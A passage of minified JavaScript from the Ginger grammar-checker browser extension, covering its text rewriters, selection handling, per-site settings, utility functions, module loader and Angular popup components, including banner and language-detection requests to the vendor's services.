        function x(e) {
            var t = window.getSelection();
            t.empty();
            var r = new Range();
            r.setStart(e, false);
            r.collapse();
            t.addRange(r);
            var n = new MouseEvent("mousedown", {
                bubbles: !0,
                cancelable: !1
            }), i = new MouseEvent("mouseup", {
                bubbles: !0,
                cancelable: !1
            });
            e.dispatchEvent(n);
            e.dispatchEvent(i);
        }
        function $(e) {
            var t = new Event("change", {
                bubbles: !0,
                cancelable: !1
            });
            e.dispatchEvent(t);
        }
        function C(e, t) {
            var r = new window.InputEvent("input", {
                bubbles: !0,
                cancelable: !1,
                inputType: "insertText",
                data: t
            });
            e.dispatchEvent(r);
        }
        function M(e, t) {
            t = Math.min(e.length, t);
            var r = -1;
            var n = [ "​", "‌", "‍" ];
            for (var i = 0; i < n.length; i++) {
                var o = n[i];
                var a = e.indexOf(o);
                -1 !== a && (r = -1 === r ? a : Math.min(r, a));
            }
            if (-1 === r || t < r) return t;
            var g = r, s = r;
            do {
                if (n.includes(e[g]) || s++, s > t) break;
                g++;
            } while (g < e.length);
            return g;
        }
        return {
            rewrite: f
        };
    }, [ "widget.rewriters.common" ]);
})();

(function() {
    var e = gingerModule.load("widget.rewriters.plainTextContentEditable", function() {
        var e = function(e, t, r, n) {
            var i = "div, p";
            var o = function(e, t, r) {
                t.nodeValue = r;
            };
            var a = gingerModule.get("widget.rewriters.common").contentEditableReplacer(e, t, r, n, i, o);
        };
        return {
            rewrite: e
        };
    }, [ "widget.rewriters.common" ]);
})();

(function() {
    var e = gingerModule.load("widget.rewriters.textarea", function() {
        var e = function(e, t, r, n) {
            var i = $gingerWidgetJquery.Deferred();
            var o = $gingerWidgetJquery(e);
            var a = o.val().length;
            var g = o.val().substring(r, n);
            var s = o.val().substring(0, r) + t + o.val().substring(n, a);
            o.val(s);
            i.resolve();
            return i.promise();
        };
        return {
            rewrite: e
        };
    }, [ "widget.rewriters.common" ]);
})();

(function() {
    var e = gingerModule.load("widget.rewriters.whatsapp.ce", function() {
        var e = function(e, t, r, n) {
            var i = function(e, t, r) {
                t.nodeValue = r;
                var n = new CustomEvent("gingerModule-eventEmitter-react-fire", {
                    detail: {
                        event: "onInput"
                    }
                });
                document.dispatchEvent(n);
                var n = new CustomEvent("gingerModule-eventEmitter-react-fire", {
                    detail: {
                        event: "onFocus"
                    }
                });
                document.dispatchEvent(n);
                $gingerWidgetJquery(e).focus();
            };
            var o = gingerModule.get("widget.rewriters.common").contentEditableReplacer(e, t, r, n, null, i);
        };
        return {
            rewrite: e
        };
    }, [ "widget.rewriters.common" ]);
})();

(function() {
    var e = gingerModule.load("widget.selectionManager", function() {
        var e = function(e) {
            var t = gingerModule.get("widget.utils").isRichTextElement(e);
            if (t) {
                return r(e);
            } else {
                return n(e);
            }
        };
        var r = function(e) {
            $gingerWidgetJquery("gwcphb").remove();
            $gingerWidgetJquery("gwcphe").remove();
            var t = window.getSelection();
            if (t.rangeCount > 0) {
                var r = t.getRangeAt(0);
                var n = r.cloneRange();
                n.collapse(true);
                var i = document.createElement("gwcphb");
                n.insertNode(i);
                n.detach();
                if (!r.collapsed) {
                    var o = r.cloneRange();
                    o.collapse();
                    var a = document.createElement("gwcphe");
                    o.insertNode(a);
                    o.detach();
                }
            }
            return null;
        };
        var n = function() {};
        var t = function(e) {
            var t = gingerModule.get("widget.utils").isRichTextElement(e);
            if (t) {
                return i(e);
            } else {
                return o(e);
            }
        };
        var i = function(e) {
            var t = e.querySelector("gwcphb");
            var r = e.querySelector("gwcphe");
            if (!t && !r) return null;
            var n = document.createRange();
            n.setStartAfter(t);
            if (r) {
                n.setEndAfter(r);
            } else {
                n.collapse(true);
            }
            if (t) t.parentNode.removeChild(t);
            if (r) r.parentNode.removeChild(r);
            n.commonAncestorContainer.normalize();
            var i = window.getSelection();
            i.removeAllRanges();
            i.addRange(n);
            return n;
        };
        var o = function() {};
        return {
            saveSelection: e,
            restoreSelection: t
        };
    }, [ "widget.utils" ]);
})();

gingerModule.load("widget.session", function() {
    var r = $gingerWidgetJquery("<eventScope>");
    var n = null;
    var e = function(e) {
        return n && e ? n[e] : n;
    };
    var t = function(e) {
        var t = JSON.stringify(n) !== JSON.stringify(e);
        n = e ? e : null;
        if (t) {
            r.trigger("change", e);
        }
    };
    var i = function() {
        return n && !n.isAnonym;
    };
    return {
        get: e,
        set: t,
        isLoggedIn: i,
        listen: r
    };
});

(function() {
    var e = gingerModule.load("widget.siteSettings", function() {
        var l = {
            kdfieneakcjfaiglcfcgkidlkmlijjnh: {
                pages: {
                    "*": {
                        rewriter: {
                            richText: "widget.rewriters.newFloating"
                        },
                        highlighter: {
                            richText: "widget.highlighters.floating"
                        }
                    }
                }
            },
            "web.whatsapp.com": {
                pages: {
                    "*": {
                        rewriter: {
                            richText: "widget.rewriters.newFloating"
                        },
                        highlighter: {
                            richText: "widget.highlighters.floating"
                        }
                    }
                },
                injection: "widget.injector.draft"
            },
            "gingersoftware.com": {
                pages: {
                    "ginger-writer": {
                        disabled: true
                    }
                }
            },
            "twitter.com": {
                pages: {
                    "*": {
                        rewriter: {
                            richText: "widget.rewriters.newReact.ce"
                        },
                        highlighter: {
                            richText: "widget.highlighters.floating"
                        }
                    }
                },
                injection: "widget.injector.draft",
                isMiniRephrase: true
            },
            "linkedin.com": {
                pages: {
                    "/messaging": {
                        postRewriteEvents: [ "input" ]
                    },
                    "/talent/job-posting": {
                        disabled: true
                    }
                },
                selectors: {
                    ".mentions-texteditor__contenteditable": {
                        rewriter: {
                            richText: "widget.rewriters.newFloating"
                        },
                        highlighter: {
                            richText: "widget.highlighters.floating"
                        }
                    }
                }
            },
            "salesforce.com": {
                pages: {
                    "/messaging": {
                        postRewriteEvents: [ "input" ]
                    },
                    "layout=EmailTemplate": {
                        disabled: true
                    }
                }
            },
            "slack.com": {},
            "discussions.apple.com": {},
            "lightning.force.com": {
                pages: {
                    "/lightning": {
                        postRewriteEvents: [ "input" ]
                    }
                }
            },
            "facebook.com": {
                pages: {
                    "*": {
                        rewriter: {
                            richText: "widget.rewriters.newReact.ce"
                        },
                        highlighter: {
                            richText: "widget.highlighters.floating"
                        }
                    },
                    "/notes": {
                        disabled: true
                    }
                },
                injection: "widget.injector.draft",
                isMiniRephrase: true
            },
            "app.hubspot.com": {
                pages: {
                    "/notes": {
                        disabled: true
                    }
                },
                injection: "widget.injector.draft"
            },
            "messenger.com": {
                pages: {
                    "*": {
                        rewriter: {
                            richText: "widget.rewriters.newFloating"
                        },
                        highlighter: {
                            richText: "widget.highlighters.floating"
                        }
                    }
                }
            },
            "work.fb.com": {
                pages: {
                    "*": {
                        rewriter: {
                            richText: "widget.rewriters.newFloating"
                        },
                        highlighter: {
                            richText: "widget.highlighters.floating"
                        }
                    }
                }
            },
            localhost: {
                pages: {
                    "/ginger-widget/quill-injector.html": {}
                },
                selectors: {
                    "[ginger-debug-ghostarea]": {
                        rewriter: {
                            richText: "widget.rewriters.newFloating"
                        },
                        highlighter: {
                            richText: "widget.highlighters.floating"
                        }
                    },
                    "[unittest-area]": {
                        postRewriteEvents: [ "input" ]
                    }
                }
            },
            "business.facebook.com": {
                pages: {
                    "*": {
                        rewriter: {
                            richText: "widget.rewriters.newFloating"
                        },
                        highlighter: {
                            richText: "widget.highlighters.floating"
                        }
                    }
                }
            },
            "instagram.com": {
                pages: {
                    "*": {
                        rewriter: {
                            richText: "widget.rewriters.newFloating"
                        },
                        highlighter: {
                            richText: "widget.highlighters.floating"
                        }
                    }
                },
                injection: "widget.injector.draft"
            },
            "mail.google.com": {
                selectors: {
                    "textarea[name=to]": {
                        disabled: true
                    },
                    "textarea[name=cc]": {
                        disabled: true
                    },
                    "textarea[name=bcc]": {
                        disabled: true
                    }
                }
            },
            "*": {
                selectors: {
                    "#advanced-search": {
                        disabled: true
                    },
                    ".cke_editable": {
                        postRewriteEvents: [ "input" ]
                    }
                }
            },
            "airbnb.com": {
                disabled: true,
                name: "AirBnB"
            },
            "evernote.com": {
                disabled: true,
                name: "Evernote"
            },
            "quora.com": {
                disabled: true,
                name: "Quora"
            },
            "paper.dropbox.com": {
                disabled: true,
                name: "Dropbox Paper"
            },
            "docs.google.com": {
                disabled: true,
                name: "Google Docs"
            },
            "hangouts.google.com": {
                disabled: true,
                name: "Google Hangouts"
            },
            "pinterest.com": {
                disabled: true,
                name: "Pinterest"
            },
            "drive.google.com": {
                disabled: true,
                name: "Google Drive"
            },
            "hootsuite.com": {
                disabled: true,
                name: "Hoot Suite"
            },
            "facebook.com/notes": {
                disabled: true,
                name: "Facebook Notes"
            },
            "onedrive.live.com": {
                disabled: true,
                name: "OneDrive"
            },
            "docs.com": {
                disabled: true,
                name: "Docs.com"
            },
            "sp.docs.com": {
                disabled: true,
                name: "Docs.com"
            },
            "texteditor.nsspot.net": {
                disabled: true,
                name: "Text Editor for Google Drive"
            },
            "jsbin.com": {
                disabled: true,
                name: "JSBin"
            },
            "jsfiddle.net": {
                disabled: true,
                name: "JsFiddle"
            },
            "mail.live.com": {
                disabled: true,
                name: "Live"
            },
            "messenger.yahoo.com": {
                disabled: true,
                name: "Yahoo Messenger"
            },
            "revealyourgift.com": {
                disabled: true,
                name: "Reveal Your Gift"
            },
            "imperavi.com": {
                disabled: true,
                name: "Imperavi"
            },
            "qualtrix.com": {
                isMiniRephrase: true
            },
            "qualtrics.com": {
                isMiniRephrase: true
            }
        };
        var u = function(e) {
            var t = e.match(/^([^:]+\:)\/\/(([^:\/?#]*)(?:\:([0-9]+))?)([\/]{0,1}[^?#]*)(\?[^#]*|)(#.*|)$/);
            return t && {
                href: e,
                protocol: t[1],
                host: t[2],
                hostname: t[3].replace(/^www\./, ""),
                port: t[4],
                pathname: t[5],
                search: t[6],
                hash: t[7]
            };
        };
        var d = function(e) {
            var t = $gingerWidgetJquery(e).closest("[data-reactroot]");
            if (t.length) {
                return true;
            }
            return false;
        };
        var f = function(e, t) {
            return e.indexOf(t, e.length - t.length) !== -1;
        };
        var e = function(e, t) {
            if (!e && !t) {
                return l;
            }
            if (!e) e = window.location.href;
            var r = u(e);
            var n = {
                rewriter: {
                    richText: "widget.rewriters.newFloating",
                    plainText: "widget.rewriters.textarea"
                },
                highlighter: {
                    richText: "widget.highlighters.floating",
                    plainText: "widget.highlighters.ghost"
                }
            };
            var i = gingerModule.get("widget.utils").isRichTextElement(t);
            var o = d(t);
            if (r && !/about:blank/i.test(e)) {
                for (var a in l) {
                    if (a === "*" || f(r.hostname, a)) {
                        if (l[a].disabled) {
                            return $gingerWidgetJquery.extend(l[a], {
                                domainDisabled: true
                            });
                        }
                        if (l[a].injection) {
                            $gingerWidgetJquery.extend(n, {
                                injection: l[a].injection
                            });
                        }
                        if (typeof l[a].isMiniRephrase !== "undefined") {
                            $gingerWidgetJquery.extend(n, {
                                isMiniRephrase: l[a].isMiniRephrase
                            });
                        }
                        if (l[a].pages) {
                            for (var g in l[a].pages) {
                                if (g === "*" || r.href.indexOf(g) >= 0) {
                                    $gingerWidgetJquery.extend(true, n, l[a].pages[g]);
                                }
                            }
                        }
                        if (t && l[a].selectors) {
                            for (var s in l[a].selectors) {
                                if ($gingerWidgetJquery(t).is(s)) {
                                    $gingerWidgetJquery.extend(true, n, l[a].selectors[s]);
                                }
                            }
                        }
                    }
                }
            }
            if (o) {
                if (i) {
                    n.highlighter.richText = "widget.highlighters.floating";
                } else {
                    n.rewriter.plainText = "widget.rewriters.draft.textarea";
                    n.highlighter.plainText = "widget.highlighters.ghost";
                }
                if (!n.injection) n.injection = "widget.injector.draft";
            }
            var c = n;
            if (i) {
                c.highlighter = n.highlighter.richText;
                c.rewriter = n.rewriter.richText;
            } else {
                c.highlighter = n.highlighter.plainText;
                c.rewriter = n.rewriter.plainText;
            }
            return n;
        };
        return {
            get: e
        };
    }, []);
})();

(function() {
    var e = gingerModule.load("widget.utils", function() {
        var e = function() {
            var e = new Date().valueOf().toString() + Math.random().toString().substr(2, 10);
            return e;
        };
        var t = function(e, t) {
            return JSON.stringify(e) === JSON.stringify(t);
        };
        var r = function(e) {
            var t = e;
            var r;
            var n = {};
            if (window.getComputedStyle) {
                var i = function(e, t) {
                    return t.toUpperCase();
                };
                r = window.getComputedStyle(t, null);
                for (var o = 0, a = r.length; o < a; o++) {
                    var g = r[o];
                    var s = g.replace(/\-([a-z])/g, i);
                    var c = r.getPropertyValue(g);
                    n[s] = c;
                }
                return n;
            }
            if (r = t.currentStyle) {
                for (var g in r) {
                    n[g] = r[g];
                }
                return n;
            }
            return e.css();
        };
        var n = function(e, t) {
            t = $gingerWidgetJquery(t);
            var r = t.offset();
            var n = t.width();
            var i = t.height();
            return e.pageX >= r.left && e.pageX <= r.left + n && e.pageY >= r.top && e.pageY <= r.top + i;
        };
        var i = function(e) {
            if (e && e.hasAttribute("contenteditable")) {
                return true;
            } else {
                return false;
            }
        };
        var o = function(e, t) {
            if (!e) e = {};
            for (var r in t) {
                e[r] = t[r];
            }
            return e;
        };
        var a = function(e) {
            return JSON.parse(JSON.stringify(e));
        };
        var g = /^[\s\-'"(\[:;,]+/;
        var s = /[\s\-'")\]!?.:;,]+$/;
        var c = function(e) {
            var t = e.match(g) || [ "" ];
            var r = e.match(s) || [ "" ];
            return {
                text: e.replace(g, "").replace(s, ""),
                post: r[0],
                pre: t[0]
            };
        };
        var l = function(e, t) {
            var r = 0;
            var n;
            for (var i = 0; i < t.length && i < e.length; i++) {
                if (e.substring(0, i) === t.substring(0, i)) {
                    r = i;
                } else {
                    break;
                }
            }
            for (var i = 0; i < t.length && i < e.length; i++) {
                if (e.substring(e.length - i, e.length) === t.substring(t.length - i, t.length)) {
                    n = i;
                } else {
                    break;
                }
            }
            return {
                preCommon: r,
                postCommon: n,
                diff: t.length - e.length,
                from: r,
                to: e.length - n
            };
        };
        var u = function(e) {
            var t, r = [], n = document.createTreeWalker(e, NodeFilter.SHOW_TEXT, null, false);
            while (t = n.nextNode()) {
                r.push(t);
            }
            return r;
        };
        var d = function(e, t, r) {
            if (typeof r == "undefined") r = t;
            var n = 0;
            var i = [];
            var o = u(e);
            if (!o.length) {
                var a = document.createTextNode("");
                e.appendChild(a);
                return [ {
                    node: a,
                    from: 0,
                    to: 0
                } ];
            }
            for (var g = 0; g < o.length; g++) {
                var s = o[g].nodeValue;
                if (n + s.length < t) {
                    n = n + s.length;
                    continue;
                }
                var c = {
                    node: o[g],
                    from: Math.max(0, t - n),
                    to: Math.min(s.length, r - n)
                };
                if (c.from !== c.to) {
                    i.push(c);
                }
                if (n + s.length > r) break;
                n = n + s.length;
            }
            return i;
        };
        var f = function(e, t, r) {
            if (typeof r == "undefined") r = t;
            var n = 0;
            var i = {
                startNode: null,
                startNodeOffset: 0,
                endNode: null,
                endNodeOffset: 0
            };
            var o = gingerModule.get("widget.utils").getTextNodesUnder(e);
            if (t === 0) {
                i.startNode = o[0];
                i.startNodeOffset = 0;
            }
            for (var a = 0; a < o.length; a++) {
                var g = o[a].nodeValue;
                if (t >= n && t <= n + g.length) {
                    if (g.length === t - n && o[a + 1]) {
                        tniOffset = 1;
                        while (o.length > a + tniOffset && o[a + tniOffset].nodeValue.length == 0) {
                            tniOffset++;
                        }
                        i.startNode = o[a + tniOffset];
                        i.startNodeOffset = 0;
                    } else {
                        i.startNode = o[a];
                        i.startNodeOffset = t - n;
                    }
                }
                if (r > n && r <= n + g.length) {
                    i.endNode = o[a];
                    i.endNodeOffset = r - n;
                }
                n = n + g.length;
            }
            return i;
        };
        var p = function(e) {
            if (!e || !e.length) return e;
            var t = [];
            for (var r = 0; r < e.length; r++) {
                t.push({
                    text: e[r].text,
                    startsAt: e[r].startsAt,
                    endsAt: e[r].endsAt,
                    activeSentence: e[r].activeSentence,
                    id: e[r].id,
                    preLineBreakCount: e[r].preLineBreakCount,
                    postLineBreakCount: e[r].postLineBreakCount,
                    words: e[r].words,
                    correction: e[r].correction
                });
                if (e[r].ignored) t[t.length - 1].ignored = e[r].ignored;
                if (e[r].charLimited) t[t.length - 1].charLimited = e[r].charLimited;
            }
            return t;
        };
        var v = function(e) {
            var t = window.document.defaultView.getComputedStyle(e, null).getPropertyValue("z-index");
            if (isNaN(t)) return 1;
            return t;
        };
        var m = function(e) {
            var t = 0;
            var r = e;
            if (e instanceof $gingerWidgetJquery) {
                r = e[0];
            }
            try {
                while (r.parentNode) {
                    var n = v(r);
                    if (n > t) t = parseInt(n);
                    r = r.parentNode;
                }
            } catch (e) {}
            return t;
        };
        return {
            merge: o,
            getNodeOffsetOfIndex: f,
            getNodeFragmentsOfIndex: d,
            generateUID: e,
            isMouseEventOverElement: n,
            clone: a,
            cloneRepresentation: p,
            compareObjects: t,
            trimAndMatch: c,
            diffString: l,
            isRichTextElement: i,
            getTextNodesUnder: u,
            getStyleOfObject: r,
            findHighestZIndex: m
        };
    });
})();

(function() {
    var e = gingerModule.load("widget", function() {
        var e;
        var n = $gingerWidgetJquery({});
        var i = [];
        var t = [];
        var r = [];
        var o = true;
        var a = [];
        var g = function(e) {
            var t = new gingerModule.get("widget.inputHandler", true);
            var r = t().init(e);
            i.push(r);
            n.trigger("input.added", r);
        };
        var s = function() {
            return i;
        };
        var c = function(e) {
            if (e.apiKey) gingerModule.get("widget.config").set("apiKey", e.apiKey);
            if (e.userId) gingerModule.get("widget.config").set("userId", e.userId);
            if (e.widgetUid) gingerModule.get("widget.config").set("widgetUid", e.widgetUid);
            if (e.apiKey) gingerModule.get("widget.config").set("apiKey", e.apiKey);
            if (e.affId) gingerModule.get("widget.config").set("affId", e.affId);
            if (e.dialect) gingerModule.get("widget.config").set("dialect", e.dialect);
            if (e.version) gingerModule.get("widget.config").set("version", e.version);
            if (e.source) gingerModule.get("widget.config").set("source", e.source);
            if (e.charLimit) gingerModule.get("widget.config").set("charLimit", e.charLimit);
            if (e.disableAddToDictionary) gingerModule.get("widget.config").set("disableAddToDictionary", e.disableAddToDictionary);
            gingerModule.get("widget.inputFinder").listen.on("new", function(e, t) {
                g(t);
            });
            $gingerWidgetJquery(document).ready(function() {
                gingerModule.get("widget.inputFinder").init(e.inputFinder);
            });
            if (console && console.log) console.log("Running Ginger Widget v" + gingerModule.get("widget.config").get("version"));
        };
        var l = function(e) {
            for (var t = 0; t < i.length; t++) {
                if (i[t].id === e) {
                    return t;
                }
            }
            return null;
        };
        var u = function(e) {
            var t = l(e);
            var r = i[t];
            if (t !== null) {
                r.destroy();
                i.splice(t, 1);
            }
            n.trigger("input.removed", r);
        };
        var d = function() {
            o = false;
            while (i.length) {
                u(i[0].id);
            }
        };
        var f = function(e) {
            o = true;
            gingerModule.get("widget.inputFinder").refresh(e);
        };
        var p = function() {
            return o;
        };
        return {
            getInputs: s,
            listen: n,
            disable: d,
            enable: f,
            remove: u,
            isEnabled: p,
            init: c
        };
    }, [ "widget.inputFinder", "widget.inputHandler", "widget.phraseService", "widget.api", "widget.config", "widget.report", "widget.licenseLimits" ]);
})();

if (!gingerModule) {
    var gingerModule = function(e, t) {
        var a = {};
        var r = null;
        var n = function(e) {
            return a[e] && a[e].isInited;
        };
        var i = function(e) {
            if (!e) return true;
            var t = true;
            for (var r = 0; r < e.length; r++) {
                if (!n(e[r])) {
                    t = false;
                }
            }
            return t;
        };
        var o = function(e) {
            var t = a[e];
            t.module = t.classCache();
            t.isInited = true;
        };
        var g = function(e) {
            var t = a[e];
            if (i(t.deps)) {
                o(e);
                return true;
            } else {
                return false;
            }
        };
        var s = function(e, t, r) {
            if (a[e]) {
                if (console && console.log) console.log("Module already loaded: " + e, "...overwriting module");
            }
            a[e] = {
                classCache: t,
                isInited: false,
                deps: r
            };
            var n = true;
            while (n) {
                n = false;
                for (var i in a) {
                    if (!a[i].isInited) {
                        var o = g(i);
                        if (!n) {
                            n = o;
                        }
                    }
                }
            }
            return a[e];
        };
        var c = function(e, t) {
            if (typeof a[e] === "undefined") {
                throw "Module '" + e + "' is not loaded. Check dependency in the end of your module definition.";
            }
            if (t) return a[e].classCache; else return a[e].module;
        };
        var l = function() {
            for (var e in a) {
                a[e] = a[e]();
            }
        };
        var u = function(e) {
            if (!a[e]) {
                console.log(e, "not added to project or has not been loaded");
                return false;
            } else if (!a[e].isInited) {
                console.log("module ", e, "not loaded, because");
                var t = a[e].deps;
                if (t.length) {
                    var r = true;
                    for (var n = 0; n < t.length; n++) {
                        var i = t[n];
                        r = r && u(i);
                    }
                    return r;
                } else {
                    return true;
                }
            } else {
                return true;
            }
        };
        return {
            load: s,
            get: c,
            debug: u
        };
    }();
}

(function(e) {
    e.module("gingerchromeext.popup", [ "ui.router", "gingerchromeext.popup.config", "gingerchromeext.popup.home", "gingerchromeext.popup.siteBlackList", "gingerchromeext.popup.switch", "gingerchromeext.popup.auth", "gingerchromeext.popup.login", "gingerchromeext.popup.storage", "gingerchromeext.popup.notsupported", "gingerchromeext.popup.synonympopup", "gingerchromeext.popup.favicon", "gingerchromeext.popup.report", "gingerchromeext.popup.backgroundConnector", "gingerchromeext.popup.banner", "gingerchromeext.popup.external", "gingerchromeext.popup.rephrase", "gingerchromeext.popup.templates" ]).config([ "$httpProvider", function(e) {
        e.defaults.withCredentials = false;
    } ]).config([ "$sceDelegateProvider", function(e) {
        e.resourceUrlWhitelist([ "https://**gingersoftware.com/**" ]);
    } ]).config([ "$locationProvider", "$stateProvider", "$httpProvider", "$urlRouterProvider", "$urlMatcherFactoryProvider", function(e, t, r, n, i) {
        e.hashPrefix("!");
        t.state("external", {
            url: "/external",
            controller: "externalController",
            resolve: {
                favicon: [ "faviconFactory", function(e) {
                    return e.retrieveCurrentFaviconUrl();
                } ],
                config: [ "configFactory", "$q", function(e, t) {
                    var r = t.defer();
                    e.retrieve().then(function(e) {
                        r.resolve();
                    }, function() {
                        r.reject();
                    });
                    return r.promise;
                } ]
            }
        }).state("external.login", {
            url: "^/login",
            templateUrl: "partials/login.partial.html",
            controller: "loginController"
        }).state("supported", {
            url: "/supported",
            abstract: true,
            resolve: {
                favicon: [ "faviconFactory", function(e) {
                    return e.retrieveCurrentFaviconUrl();
                } ],
                shouldBeSupported: [ "siteBlackListFactory", "configFactory", "backgroundConnectorFactory", "$q", "$state", function(e, t, r, n, i) {
                    var o = n.defer();
                    e.getCurrentHost().then(function(e) {
                        o.resolve();
                    });
                    return n.promise;
                } ],
                config: [ "configFactory", "$q", function(e, t) {
                    var r = t.defer();
                    e.retrieve().then(function() {
                        r.resolve();
                    }, function() {
                        r.reject();
                    });
                    return r.promise;
                } ]
            }
        }).state("supported.home", {
            url: "/home",
            templateUrl: "partials/home.partial.html",
            controller: "homeController"
        }).state("notsupported", {
            url: "/notsupported",
            templateUrl: "partials/notsupported.partial.html",
            controller: "notsupportedController",
            resolve: {
                favicon: [ "faviconFactory", function(e) {
                    return e.retrieveCurrentFaviconUrl();
                } ],
                shouldBeSupported: [ "siteBlackListFactory", "backgroundConnectorFactory", "configFactory", "$q", "$state", function(e, t, r, n, i) {
                    var o = n.defer();
                    e.getCurrentHost().then(function(e) {
                        t.call({
                            module: "gingerchromeext.background.nonSupportedSites",
                            callFunction: "isUrlEnabled",
                            callArgs: [ e ]
                        }, function(e) {
                            if (!e) {
                                o.resolve();
                            } else {
                                i.go("supported.home");
                                o.reject();
                            }
                        });
                    });
                    return n.promise;
                } ],
                config: [ "configFactory", "$q", function(e, t) {
                    var r = t.defer();
                    e.retrieve().then(function() {
                        r.resolve();
                    }, function() {
                        r.reject();
                    });
                    return r.promise;
                } ]
            }
        });
        n.otherwise("/external");
    } ]);
})(window.angular);

angular.module("gingerchromeext.popup.backgroundConnector", []);

angular.module("gingerchromeext.popup.banner", []);

angular.module("gingerchromeext.popup.external", []);

angular.module("gingerchromeext.popup.favicon", []);

angular.module("gingerchromeext.popup.home", []);

angular.module("gingerchromeext.popup.login", []);

angular.module("gingerchromeext.popup.notsupported", []);

(function(e) {
    e.module("gingerchromeext.popup.rephrase", []);
})(window.angular);

angular.module("gingerchromeext.popup.report", []);

angular.module("gingerchromeext.popup.auth", []);

angular.module("gingerchromeext.popup.siteBlackList", []);

angular.module("gingerchromeext.popup.storage", []);

angular.module("gingerchromeext.popup.switch", []);

angular.module("gingerchromeext.popup.synonympopup", []);

gingerModule.load("gingerchromeext.browser", function() {
    return chrome;
});

(function(e) {
    e.module("gingerchromeext.popup.backgroundConnector").factory("backgroundConnectorFactory", [ "$q", function(r) {
        var i = function(e, n) {
            gingerModule.get("gingerchromeext.browser").runtime.sendMessage(e, function(e, t, r) {
                if (n) n(e);
            });
        };
        var o = function(e) {
            var t = r.defer();
            e.promise = true;
            i(e, function(e) {
                if (e.rejected) {
                    t.reject(e.result);
                } else {
                    t.resolve(e.result);
                }
            });
            return t.promise;
        };
        var e = function(n) {
            var e = function(e, t) {
                if (n.promise) {
                    n.callArgs = [];
                    for (var r = 0; r < arguments.length; r++) {
                        n.callArgs.push(arguments[r]);
                    }
                    return o(n);
                } else {
                    n.callArgs = [ e ];
                    return i(n, t);
                }
            };
            return e;
        };
        return {
            call: i,
            callPromise: o,
            proxy: e
        };
    } ]);
})(window.angular);

angular.module("gingerchromeext.popup.banner").directive("gingerBanner", [ "gingerBannerService", "$sce", "$timeout", function(e, t, r) {
    function n(e, t, r) {
        e.banner = {};
    }
    return {
        link: n,
        scope: {
            placement: "@gingerBanner"
        },
        template: '<iframe class="ginger-banner-frame" style="width:{{banner.width}}px;height:{{banner.height}}px;" ng-src="{{banner.url}}"></iframe>'
    };
} ]);

angular.module("gingerchromeext.popup.banner").factory("gingerBannerService", [ "$http", "$q", "$rootScope", "sessionFactory", function(o, a, e, g) {
    var s = e.$new(true);
    var t = function(e) {
        var r = a.defer();
        var t = "https://clientmessages.gingersoftware.com/banner";
        var n = g.get();
        if (!n) {
            r.reject();
            return r.promise();
        }
        var i = t + "/" + n.userId + "/" + e + "/chromeextension?affId=A";
        o({
            method: "GET",
            url: i
        }).then(function(e) {
            var t = e.data;
            if (t && t.url) {
                s.$emit("banner.received");
                r.resolve(t);
            }
        }, function(e) {
            console.error("Cant get banner for user", e);
            r.reject();
        });
        return r.promise;
    };
    return {
        listen: s,
        getBanner: t
    };
} ]);

angular.module("gingerchromeext.popup.config", []).factory("configFactory", [ "backgroundConnectorFactory", "$rootScope", "$q", function(e, r, n) {
    var i = {};
    r.config = i;
    var t = function() {
        var t = n.defer();
        e.call({
            module: "gingerchromeext.background.config",
            callFunction: "get"
        }, function(e) {
            if (e) {
                o(e);
            }
            t.resolve(i);
        });
        return t.promise;
    };
    var o = function(e, t) {
        if (angular.isUndefined(t)) {
            i = e;
        } else {
            i[e] = t;
        }
        r.config = i;
        return i;
    };
    var a = function(e) {
        return angular.isDefined(e) ? i[e] : i;
    };
    return {
        get: a,
        set: o,
        retrieve: t
    };
} ]);

(function(e) {
    e.module("gingerchromeext.popup.external").controller("externalController", [ "$scope", "siteBlackListFactory", "faviconFactory", "sessionFactory", "configFactory", "$state", "$timeout", "reportingFactory", "storageFactory", function(e, t, r, n, i, o, a, g, s) {
        e.config = i.get();
        var c = function() {
            o.go("supported.home");
        };
        c();
    } ]);
})(window.angular);

(function(e) {
    e.module("gingerchromeext.popup.favicon").factory("faviconFactory", [ "$q", "$sce", function(e, r) {
        var n = null;
        var t = function() {
            return n;
        };
        var i = function() {
            var t = e.defer();
            try {
                gingerModule.get("gingerchromeext.browser").tabs.query({
                    active: true,
                    currentWindow: true
                }, function(e) {
                    if (e[0].favIconUrl && e[0].favIconUrl.match(/^https?/i)) {
                        n = r.trustAsResourceUrl(e[0].favIconUrl);
                    } else {
                        n = null;
                    }
                    t.resolve(n);
                });
            } catch (e) {
                console.error("Failed to retrieve favicon for active tab", e);
                t.resolve(n);
            }
            return t.promise;
        };
        return {
            getFaviconUrl: t,
            retrieveCurrentFaviconUrl: i
        };
    } ]);
})(window.angular);

(function(_) {
    _.module("gingerchromeext.popup.home").controller("homeController", [ "sessionFactory", "backgroundConnectorFactory", "configFactory", "$scope", "$state", "$http", "$timeout", "faviconFactory", "storageFactory", "siteBlackListFactory", "reportingFactory", "gingerBannerService", "synonympopupFactory", "$rootScope", "$window", "rephraseService", function(t, r, n, g, e, i, o, a, s, c, l, u, d, f, p, v) {
        var m = null;
        var h = f.$new(true);
        var w = null;
        var y = null;
        var b = 0;
        var x = 0;
        var $;
        var C = false;
        var M = function(e, t, r) {
            var n = gingerModule.get("widget.utils").getTextNodesUnder(e);
            var i = 0;
            for (var o = 0; o < n.length; o++) {
                var a = n[o].nodeValue.length;
                if (i + a > t[r].startsAt) {
                    var g = document.createRange();
                    g.setStart(n[o], t[r].startsAt - i);
                    g.setEnd(n[n.length - 1], n[n.length - 1].nodeValue.length);
                    $ = document.createElement("gwofw");
                    $.appendChild(g.extractContents());
                    g.insertNode($);
                    return;
                }
                i += a;
            }
        };
        var W = function(e, r) {
            var t = {
                inputText: e
            };
            $gingerWidgetJquery.ajax({
                url: "https://async.reverso.net/WebReferences/WSAJAXInterface.asmx/DetectLanguageWS",
                data: JSON.stringify(t),
                method: "POST",
                dataType: "json",
                contentType: "application/json; charset=utf-8"
            }).then(function e(t) {
                r(t);
            }, function e() {});
        };
        var S;
        var q = function(e) {
            if (g.session.license !== 0) {
                if (g.main.charcount > g.main.charLimit) {
                    if (!C) {
                        l.reporterGA({
                            category: "Premium",
                            action: "Display Premium for Character Limit",
                            label: null,
                            value: null
                        });
                        C = true;
                    }
                } else {
                    C = false;
                }
            }
            if (document.querySelector("#mini-writer") && document.querySelector("#mini-writer").innerHTML === S) return;
            var t;
            if (e === document.activeElement) {
                t = document.createElement("gwcp");
                var r = window.getSelection();
                r.getRangeAt(0).insertNode(t);
            }
            $gingerWidgetJquery(e).find("[style]").removeAttr("style");
            $gingerWidgetJquery(e).find("gwofw").contents().unwrap();
            var n = m.getRepresentation();
